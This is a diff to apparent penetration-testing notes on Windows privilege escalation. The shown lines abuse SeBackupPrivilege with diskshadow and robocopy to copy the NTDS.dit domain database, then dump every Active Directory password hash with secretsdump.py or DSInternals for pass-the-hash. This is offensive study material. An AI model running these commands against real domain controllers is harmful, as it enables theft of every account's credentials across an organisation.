@@ -2924,7 +2924,7 @@ apt update hooking (PreInvoke)
 | SeLoadDriverPrivilege | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers) | Administrators | This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code. |
 | SeRestorePrivilege | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) | Administrators | This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object. |
 
-##### Enabling SeTakeOwnershipPrivilege
+##### SeTakeOwnershipPrivilege
 
 | **Command** | **Description** |
 | --- | --- |
@@ -2959,7 +2959,7 @@ c:\inetpub\wwwwroot\web.config
 We may also come across .kdbx KeePass database files, OneNote notebooks, files such as passwords.*, pass.*, creds.*, scripts, other configuration files, virtual hard drive files, and more that we can target to extract sensitive information from to elevate our privileges and further our access.
 ```
 
-##### Enabling SeBackupPrivilege
+##### SeBackupPrivilege
 
 The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.
 
@@ -2975,6 +2975,8 @@ This can allow for attacks on the DC including copying protected files such as N
 | ` Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt `| Copy Protected file once priv enabled | 
 
 With the priv now enabled, we can focus on attacking the NTDS file, by first making a copy of the disk using diskshadow. As we are unable to fully interact with the NTDS.dit file as it is in use, unlike a copied version.  
+
+###### Copying NTDS using SeBackupPriv
 
 ```
 diskshadow.exe
@@ -3015,6 +3017,8 @@ By using diskshadow, we have now made a copy of the C:\ drive which can be used 
 
 `Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit`
 
+###### Extracting/Dumping hashes 
+
 With the NTDS.dit extracted, we can use a tool such as secretsdump.py or the PowerShell DSInternals module to extract all Active Directory account credentials. Below example extracts the Administrator using DSInternals 
 
 ```
@@ -3027,8 +3031,10 @@ We can achieve similar using SecretsDump to dump hashes locally for use with Pas
 
 `secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`
 
+###### Robocopy 
+The built-in utility robocopy can be used to copy files in backup mode as well. Robocopy is a command-line directory replication tool. It can be used to create backup jobs and includes features such as multi-threaded copying, automatic retry, the ability to resume copying, and more. Robocopy differs from the copy command in that instead of just copying all files, it can check the destination directory and remove files no longer in the source directory.
 
-
+`robocopy /B E:\Windows\NTDS .\ntds ntds.dit` 
 
 ### Handy Commands
 
